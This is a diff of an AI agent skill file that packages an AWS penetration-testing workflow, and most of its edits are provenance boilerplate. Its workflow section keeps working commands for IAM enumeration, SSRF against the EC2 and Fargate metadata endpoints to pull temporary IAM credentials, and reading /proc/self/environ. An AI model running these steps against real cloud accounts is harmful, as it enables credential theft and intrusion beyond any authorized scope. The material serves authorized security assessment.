@@ -1,6 +1,6 @@
 ---
 name: aws-penetration-testing
-description: "AWS Penetration Testing workflow skill. Use this skill when the user needs Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations and the operator should rely on the packaged workflow, support pack, troubleshooting notes, and provenance links before merging or handing off."
+description: "AWS Penetration Testing workflow skill. Use this skill when the user needs Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
 version: "0.0.1"
 category: testing-security
 tags: ["aws-penetration-testing", "provide", "comprehensive", "techniques", "for", "penetration", "testing", "aws"]
@@ -10,7 +10,7 @@ tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
 source: community
 author: "zebbern"
 date_added: "2026-04-12"
-date_updated: "2026-04-12"
+date_updated: "2026-04-14"
 ---
 
 # AWS Penetration Testing
@@ -21,7 +21,7 @@ This public intake copy packages `plugins/antigravity-awesome-skills-claude/skil
 
 Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.
 
-The packaged support pack adds a checklist, rubric, playbook, prompt template, router note, and source manifest so reviewers can audit the import as a complete workflow kit instead of a raw file dump.
+This intake keeps the copied upstream files intact and uses `EXTERNAL_SOURCE.json` plus `ORIGIN.md` as the provenance anchor for review.
 
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # AWS Penetration Testing
 
@@ -35,18 +35,18 @@ Use this section as the trigger filter. It should make the activation boundary e
 - Use when the request clearly matches the imported source intent: Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence....
 - Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
 - Use when provenance needs to stay visible in the answer, PR, or review packet.
-- Use when the support pack, checklist, rubric, and playbook should guide execution before touching code or tools.
+- Use when copied upstream references, examples, or scripts materially improve the answer.
 - Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.
 
 ## Operating Table
 
 | Situation | Start here | Why it matters |
 | --- | --- | --- |
-| First-time use | `references/omni-import-playbook.md` | Establishes the workflow, review packet, and provenance expectations before work begins |
-| PR review or merge readiness | `references/omni-import-rubric.md` | Turns the imported skill into a checklist-driven review packet instead of an opaque file copy |
-| Source or lineage verification | `scripts/omni_import_print_origin.py` | Confirms repository, branch, commit, and imported path quickly |
-| Workflow execution | `references/omni-import-checklist.md` | Gives the operator the smallest useful entry point into the support pack |
-| Handoff decision | `agents/omni-import-router.md` | Helps the operator switch to a stronger native skill when the task drifts |
+| First-time use | `EXTERNAL_SOURCE.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
+| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
+| Workflow execution | `references/advanced-aws-pentesting.md` | Starts with the smallest copied file that materially changes execution |
+| Supporting context | `references/advanced-aws-pentesting.md` | Adds the next most relevant copied source file without loading the entire package |
+| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |
 
 ## Workflow
 
@@ -56,7 +56,7 @@ This workflow is intentionally editorial and operational at the same time. It ke
 2. ### Step 2: IAM Enumeration bash # List all users aws iam list-users # List groups for user aws iam list-groups-for-user --user-name TARGETUSER # List attached policies aws iam list-attached-user-policies --user-name TARGETUSER # List inline policies aws iam list-user-policies --user-name TARGETUSER # Get policy details aws iam get-policy --policy-arn POLICYARN aws iam get-policy-version --policy-arn POLICYARN --version-id v1 # List roles aws iam list-roles aws iam list-attached-role-policies --role-name ROLENAME ### Step 3: Metadata SSRF (EC2) Exploit SSRF to access metadata endpoint (IMDSv1): bash # Access metadata endpoint http://169.254.169.254/latest/meta-data/ # Get IAM role name http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Extract temporary credentials http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME # Response contains: { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "2019-08-01T05:20:30Z" } For IMDSv2 (token required): bash # Get token first TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \ "http://169.254.169.254/latest/api/token") # Use token for requests curl -H "X-aws-ec2-metadata-token:$TOKEN" \ "http://169.254.169.254/latest/meta-data/iam/security-credentials/" Fargate Container Credentials: bash # Read environment for credential path /proc/self/environ # Look for: AWSCONTAINERCREDENTIALSRELATIVEURI=/v2/credentials/...
 3. # Access credentials http://169.254.170.2/v2/credentials/CREDENTIAL-PATH `` ---
 4. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.
-5. Read the overview, playbook, and source summary before loading any upstream support files.
+5. Read the overview and provenance files before loading any copied upstream support files.
 6. Load only the references, examples, prompts, or scripts that materially change the outcome for the current request.
 7. Execute the upstream workflow while keeping provenance and source boundaries explicit in the working notes.
 
@@ -163,31 +163,31 @@ Provide comprehensive techniques for penetration testing AWS cloud environments.
 ### Example 1: Ask for the upstream workflow directly
 
 ```text
-Use @aws-penetration-testing to handle <task>. Start with the workflow playbook, load only the upstream files that change the outcome, and keep provenance visible in the answer.
+Use @aws-penetration-testing to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
 ```
 
 **Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.
 
-### Example 2: Inspect origin and import state
+### Example 2: Ask for a provenance-grounded review
 
-```bash
-python3 skills/aws-penetration-testing/scripts/omni_import_print_origin.py
+```text
+Review @aws-penetration-testing against EXTERNAL_SOURCE.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
 ```
 
-**Explanation:** Use this before review or troubleshooting when you need to confirm source repository, branch, commit, and path.
+**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.
 
-### Example 3: Review the support pack before execution
+### Example 3: Narrow the copied support files before execution
 
-```bash
-python3 skills/aws-penetration-testing/scripts/omni_import_list_support_pack.py
+```text
+Use @aws-penetration-testing for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
 ```
 
-**Explanation:** This gives the operator a quick inventory of the imported references, examples, scripts, router notes, and manifest files.
+**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.
 
 ### Example 4: Build a reviewer packet
 
 ```text
-Review @aws-penetration-testing using the checklist, rubric, playbook, and source manifest, then summarize any gaps before merge.
+Review @aws-penetration-testing using the copied upstream files plus provenance, then summarize any gaps before merge.
 ```
 
 **Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.
@@ -239,12 +239,12 @@ aws sts get-caller-identity
 
 ## Best Practices
 
-Treat the generated public skill as a reviewable packaging layer around the upstream repository. The checklist, rubric, worksheet, template, and playbook are there to make the import auditable, not to hide the source material.
+Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.
 
 - Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
 - Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
 - Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
-- Use the checklist, rubric, worksheet, and playbook together instead of relying on a single section in isolation.
+- Point directly at the copied upstream files that justify the workflow instead of relying on generic review boilerplate.
 - Treat generated examples as scaffolding; adapt them to the concrete task before execution.
 - Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.
 
@@ -254,18 +254,18 @@ Treat the generated public skill as a reviewable packaging layer around the upst
 
 ### Problem: The operator skipped the imported context and answered too generically
 
-**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/aws-penetration-testing`, fails to mention provenance, or does not use the support pack at all.
-**Solution:** Re-open the checklist, playbook, source summary, and source manifest. Load only the upstream files that materially change the answer, then restate the provenance before continuing.
+**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/aws-penetration-testing`, fails to mention provenance, or does not use any copied source files at all.
+**Solution:** Re-open `EXTERNAL_SOURCE.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.
 
 ### Problem: The imported workflow feels incomplete during review
 
 **Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
-**Solution:** Use the operator packet and support-pack listing to point at the exact references, examples, scripts, and router notes that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.
+**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.
 
 ### Problem: The task drifted into a different specialization
 
 **Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
-**Solution:** Use the router note and related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.
+**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.
 
 ### Imported Troubleshooting Notes
 
@@ -283,31 +283,25 @@ Treat the generated public skill as a reviewable packaging layer around the upst
 
 ## Related Skills
 
-- `@00-andruia-consultant` - Use when the work is better handled by that native specialization after this imported skill establishes context.
-- `@00-andruia-consultant-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
-- `@10-andruia-skill-smith` - Use when the work is better handled by that native specialization after this imported skill establishes context.
-- `@10-andruia-skill-smith-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
+- `@arm-cortex-expert` - Use when the work is better handled by that native specialization after this imported skill establishes context.
+- `@asana-automation` - Use when the work is better handled by that native specialization after this imported skill establishes context.
+- `@ask-questions-if-underspecified` - Use when the work is better handled by that native specialization after this imported skill establishes context.
+- `@astro` - Use when the work is better handled by that native specialization after this imported skill establishes context.
 
 ## Additional Resources
 
-Use this support matrix and the linked files below as the operational packet for this imported skill. Together they provide the checklist, rubric, template, playbook, router guidance, and manifest that the validator expects to see represented in the public skill.
+Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.
 
 | Resource family | What it gives the reviewer | Example path |
 | --- | --- | --- |
-| `references` | checklists, rubrics, playbooks, and source summaries | `references/advanced-aws-pentesting.md` |
-| `examples` | prompt packets and usage templates | `examples/omni-import-operator-packet.md` |
-| `scripts` | origin inspection and support-pack listing | `scripts/omni_import_list_support_pack.py` |
-| `agents` | routing and handoff guidance | `agents/omni-import-router.md` |
-| `assets` | machine-readable source manifest | `assets/omni-import-source-manifest.json` |
+| `references` | copied reference notes, guides, or background material from upstream | `references/advanced-aws-pentesting.md` |
+| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
+| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
+| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
+| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |
 
-- [Imported intake checklist](references/omni-import-checklist.md)
-- [Imported review rubric](references/omni-import-rubric.md)
-- [Imported workflow playbook](references/omni-import-playbook.md)
-- [Imported source summary](references/omni-import-source-summary.md)
-- [Imported operator packet](examples/omni-import-operator-packet.md)
-- [Imported prompt template](examples/omni-import-prompt-template.md)
-- [Print origin details](scripts/omni_import_print_origin.py)
-- [List support pack](scripts/omni_import_list_support_pack.py)
+- [advanced-aws-pentesting.md](references/advanced-aws-pentesting.md)
+- [advanced-aws-pentesting.md](references/advanced-aws-pentesting.md)
 
 ### Imported Reference Notes
 
